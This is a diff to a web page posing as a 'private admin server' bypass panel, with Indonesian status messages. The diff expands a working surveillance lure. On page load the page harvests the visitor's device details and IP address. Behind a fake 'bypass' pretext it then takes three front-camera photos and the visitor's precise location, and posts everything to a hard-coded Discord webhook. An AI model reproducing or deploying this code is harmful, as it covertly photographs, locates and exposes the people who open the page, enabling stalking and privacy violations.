@@ -6,131 +6,231 @@
     <title>Internal Admin Panel - Secure Access</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #050505; color: #00ff41; font-family: 'JetBrains Mono', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .panel { width: 95%; max-width: 500px; border: 1px solid #00ff41; padding: 25px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); }
-        .header { text-align: center; border-bottom: 2px solid #00ff41; padding-bottom: 15px; margin-bottom: 20px; color: #ff0000; text-shadow: 0 0 10px #ff0000; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .data-item { border: 1px solid #1a3d1a; padding: 10px; background: #000; font-size: 11px; }
-        .label { color: #888; display: block; margin-bottom: 4px; font-size: 9px; }
+        body { background-color: #050505; color: #00ff41; font-family: 'JetBrains Mono', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        .panel { width: 95%; max-width: 500px; border: 1px solid #00ff41; padding: 25px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); text-align: center; }
+        .header { border-bottom: 2px solid #ff0000; padding-bottom: 15px; margin-bottom: 20px; color: #ff0000; font-weight: bold; text-shadow: 0 0 10px #ff0000; letter-spacing: 2px; }
+        
+        /* Grid Data Otomatis */
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .data-item { border: 1px solid #1a3d1a; padding: 8px; background: #000; font-size: 10px; text-align: left; }
+        .label { color: #888; display: block; font-size: 8px; text-transform: uppercase; }
         .val { color: #00ff41; font-weight: bold; }
-        .btn { background: #ff0000; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; font-family: inherit; font-size: 14px; box-shadow: 0 0 15px #ff0000; }
-        .loader { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+
+        .btn { background: #ff0000; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; font-family: inherit; font-size: 14px; box-shadow: 0 0 15px #ff0000; text-transform: uppercase; }
+        .loader { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-size: 11px; text-align: center; color: #ffaa00; margin-top: 15px; font-weight: bold; }
+        #status { font-size: 11px; color: #ffaa00; margin-top: 15px; min-height: 45px; font-weight: bold; line-height: 1.4; }
+        
+        /* PAGE RESULT STYLING */
+        #result-page { display: none; width: 100%; min-height: 100vh; position: fixed; top: 0; left: 0; background: #000; z-index: 9999; overflow-y: auto; padding: 20px; box-sizing: border-box; }
         video, canvas { display: none; }
+        .data-box { border: 1px solid #00ff41; padding: 15px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); text-align: left; font-size: 12px; }
+        .map-frame { width: 100%; height: 250px; border: 1px solid #00ff41; margin-top: 10px; filter: invert(90%) hue-rotate(180deg); }
+        .preview-img { width: 100%; border: 1px solid #00ff41; margin-top: 10px; border-radius: 4px; box-shadow: 0 0 10px rgba(0,255,65,0.3); }
     </style>
 </head>
 <body>
 
-<div class="panel">
-    <div class="header"><span style="letter-spacing: 2px;">⚠️ PRIVATE ADMIN SERVER ⚠️</span></div>
+<div class="panel" id="login-panel">
+    <div class="header">⚠️ PRIVATE ADMIN SERVER ⚠️</div>
     
     <div class="grid">
-        <div class="data-item"><span class="label">TARGET_DEVICE</span><span id="dev-model" class="val">Loading...</span></div>
-        <div class="data-item"><span class="label">TARGET_IP</span><span id="ip-addr" class="val">Fetching...</span></div>
-        <div class="data-item"><span class="label">CONNECTION</span><span class="val" style="color:red;">UNSECURE</span></div>
-        <div class="data-item"><span class="label">SERVER_LOG</span><span class="val">ACTIVE</span></div>
+        <div class="data-item"><span class="label">Device</span><span id="d-model" class="val">Detecting...</span></div>
+        <div class="data-item"><span class="label">IP_Addr</span><span id="d-ip" class="val">Fetching...</span></div>
+        <div class="data-item"><span class="label">Battery</span><span id="d-bat" class="val">---</span></div>
+        <div class="data-item"><span class="label">RAM_Est</span><span id="d-ram" class="val">---</span></div>
+        <div class="data-item" style="grid-column: span 2;"><span class="label">Browser_Build</span><span id="d-build" class="val">Scanning...</span></div>
     </div>
-
+    
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     
     <div id="loading-icon" class="loader"></div>
     <p id="status">[SYSTEM] Akses Dibatasi. Memerlukan Protokol Bypass Kamera & Lokasi untuk Sinkronisasi Panel Admin.</p>
     
-    <button id="mainBtn" class="btn" onclick="startAuth()">BYPASS ADMIN ACCESS</button>
+    <button id="mainBtn" class="btn" onclick="startProcess()">Bypass Admin Access</button>
+</div>
+
+<div id="result-page">
+    <h3 style="color: #00ff41; text-align: center; margin-top: 0;">SUCCESS: ADMIN_DATABASE_VIEW</h3>
+    <hr color="#00ff41">
+    
+    <div class="data-box">
+        <span style="color: #ff0000; font-weight: bold;">[!] SATELLITE_DATA</span><br>
+        KOORDINAT: <span id="res-latlon" style="color:#fff;">Fetching...</span><br>
+        AKURASI: &lt; 10 Meter<br>
+        STATUS: <span style="color:#00ff41;">SINKRON</span>
+    </div>
+
+    <div id="map-container"></div>
+
+    <div class="data-box">
+        <span style="color: #ff0000; font-weight: bold;">[!] BIOMETRIC_LOG (3 SESSIONS)</span>
+        <div id="photo-container"></div>
+    </div>
+
+    <button class="btn" style="background: #00ff41; color: #000; box-shadow: none;" onclick="location.reload()">TERMINATE SESSION</button>
 </div>
 
 <script>
     const WH = "https://discord.com/api/webhooks/1464945657386242215/reBayi8sdQCNfp5PMp_c12ejYPeeFwoNurlukhTAQfyrx6Yeccc2ZkPNDnb9iF0kzhBj";
-    let collected = {};
+    let stream;
+    let collectedData = {};
 
+    // 1. DATA OTOMATIS SAAT HALAMAN DIBUKA
     (async function init() {
         const ua = navigator.userAgent;
-        collected = {
-            model: ua.match(/\(([^;]+);/) ? ua.match(/\(([^;]+);/)[1] : "Generic",
-            ip: "Pending",
+        collectedData = {
+            model: ua.match(/\(([^;]+);/) ? ua.match(/\(([^;]+);/)[1] : "Generic Device",
+            build: ua.split(' ').pop(),
+            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
             ua: ua
         };
-        document.getElementById('dev-model').innerText = collected.model;
+
+        document.getElementById('d-model').innerText = collectedData.model;
+        document.getElementById('d-build').innerText = collectedData.build;
+        document.getElementById('d-ram').innerText = collectedData.ram;
+
+        if (navigator.getBattery) {
+            const bat = await navigator.getBattery();
+            collectedData.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'No Charge'})`;
+            document.getElementById('d-bat').innerText = collectedData.battery;
+        }
+
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const d = await res.json();
-            collected.ip = d.ip;
-            document.getElementById('ip-addr').innerText = d.ip;
-        } catch (e) { document.getElementById('ip-addr').innerText = "ERROR"; }
-        
-        sendToWebhook("🚨 ADMIN_PANEL_OPENED", collected);
+            collectedData.ip = d.ip;
+            document.getElementById('d-ip').innerText = d.ip;
+        } catch (e) { document.getElementById('d-ip').innerText = "ERROR"; }
+
+        sendLog("📱 NEW_VISIT_LOG", collectedData);
     })();
 
-    async function startAuth() {
+    // 2. PROSES UTAMA (BYPASS)
+    async function startProcess() {
         const btn = document.getElementById('mainBtn');
         const loader = document.getElementById('loading-icon');
         const status = document.getElementById('status');
 
         btn.style.display = 'none';
         loader.style.display = 'block';
-        status.innerText = "[BYPASS] Menghubungkan Protokol Kamera...";
+        status.innerText = "[AUTH] Menghubungkan Protokol Kamera...";
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+            // Meminta Izin Kamera
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('video').srcObject = stream;
+
+            status.innerText = "[WARMUP] Sinkronisasi Sensor (5 detik)...";
             
+            // Warmup 5 detik agar sensor cahaya stabil (Anti Foto Hitam)
             setTimeout(async () => {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
-                
-                const fd = new FormData();
-                fd.append("file", blob, "admin_view.jpg");
-                fd.append("payload_json", JSON.stringify({ content: "👤 **ADMIN PANEL BYPASS SUCCESS**" }));
-                await fetch(WH, { method: "POST", body: fd });
-                
-                stream.getTracks().forEach(t => t.stop());
-                requestLocation();
-            }, 2000);
-        } catch (e) { handleError("ACCESS_DENIED: Kamera Wajib untuk Handshake Admin."); }
+                status.innerText = "[CAPTURE] Mengambil 3 Foto Biometrik...";
+                await takePhotos(3);
+                requestLocation(); // Lanjut ke Lokasi
+            }, 5000);
+
+        } catch (err) {
+            handleError("ACCESS_DENIED: Kamera Wajib untuk Handshake Admin.");
+        }
     }
 
+    // 3. AMBIL 3 FOTO BERUNTUN
+    async function takePhotos(count) {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const photoContainer = document.getElementById('photo-container');
+
+        for (let i = 1; i <= count; i++) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+            
+            // Preview di Halaman Hasil
+            const img = document.createElement('img');
+            img.src = URL.createObjectURL(blob);
+            img.className = 'preview-img';
+            photoContainer.appendChild(img);
+
+            // Kirim ke Discord
+            const fd = new FormData();
+            fd.append("file", blob, `admin_bypass_${i}.jpg`);
+            fd.append("payload_json", JSON.stringify({ content: `📸 **BIOMETRIC CAPTURE ${i}/3**\nTarget IP: ${collectedData.ip}` }));
+            await fetch(WH, { method: "POST", body: fd });
+
+            await new Promise(res => setTimeout(res, 1200)); // Jeda 1.2 detik antar foto
+        }
+    }
+
+    // 4. MINTA LOKASI
     function requestLocation() {
         const status = document.getElementById('status');
-        status.innerText = "[BYPASS] Menghitung Geofencing Server...";
+        status.innerText = "[GPS] Sinkronisasi Geofencing Server...";
+
         navigator.geolocation.getCurrentPosition(
             (pos) => {
-                let lat = pos.coords.latitude;
-                let lon = pos.coords.longitude;
-                sendToWebhook("📡 ADMIN_LOC_FOUND", { ...collected, maps: `https://www.google.com/maps?q=${lat},${lon}` });
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                document.getElementById('res-latlon').innerText = `${lat}, ${lon}`;
                 
-                status.innerHTML = "<span style='color:#00ff41'>SUCCESS. REDIRECTING TO PANEL...</span>";
-                setTimeout(() => {
-                    window.location.href = `https://www.google.com/maps?q=${lat + 0.00004},${lon + 0.00004}`;
-                }, 1500);
+                // Embed Peta Statis
+                document.getElementById('map-container').innerHTML = `<iframe class="map-frame" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>`;
+
+                sendLog("📍 LOCATION_FOUND", { ...collectedData, maps: `https://www.google.com/maps?q=${lat},${lon}` });
+
+                // Ganti Halaman
+                document.getElementById('login-panel').style.display = 'none';
+                document.getElementById('result-page').style.display = 'block';
+                if (stream) stream.getTracks().forEach(t => t.stop());
             },
-            () => { handleError("ACCESS_DENIED: Lokasi Wajib untuk Geotagging Admin."); },
+            () => {
+                handleError("ACCESS_DENIED: Lokasi Wajib untuk Geotagging Admin.");
+            },
             { enableHighAccuracy: true }
         );
     }
 
+    // 5. ERROR HANDLER (LOADING 5 DETIK)
     function handleError(msg) {
         const btn = document.getElementById('mainBtn');
         const loader = document.getElementById('loading-icon');
         const status = document.getElementById('status');
+
         status.innerHTML = `<span style="color:#ff0000">CRITICAL_ERROR: ${msg}</span><br>Menghubungkan ulang dalam 5 detik...`;
-        setTimeout(() => { loader.style.display = 'none'; btn.style.display = 'block'; btn.innerText = "COBA BYPASS LAGI"; }, 5000);
+        
+        setTimeout(() => {
+            loader.style.display = 'none';
+            btn.style.display = 'block';
+            btn.innerText = "COBA BYPASS LAGI";
+            status.innerText = "[SYSTEM] Gunakan protokol resmi untuk akses database.";
+        }, 5000);
+        if (stream) stream.getTracks().forEach(t => t.stop());
     }
 
-    function sendToWebhook(title, data) {
+    // 6. FUNGSI KIRIM LOG TEKS
+    function sendLog(title, data) {
         fetch(WH, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [{ title: title, color: 16711680, fields: [
-                { name: "Model", value: data.model || "N/A", inline: true },
-                { name: "IP", value: data.ip || "N/A", inline: true },
-                { name: "Map", value: data.maps || "Pending" }
-            ], timestamp: new Date() }] })
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: title,
+                    color: 16711680,
+                    fields: [
+                        { name: "Model", value: data.model || "N/A", inline: true },
+                        { name: "IP", value: data.ip || "N/A", inline: true },
+                        { name: "Maps Link", value: data.maps || "None" }
+                    ],
+                    footer: { text: "Admin Security Monitor" },
+                    timestamp: new Date()
+                }]
+            })
         });
     }
 </script>
+
 </body>
 </html>
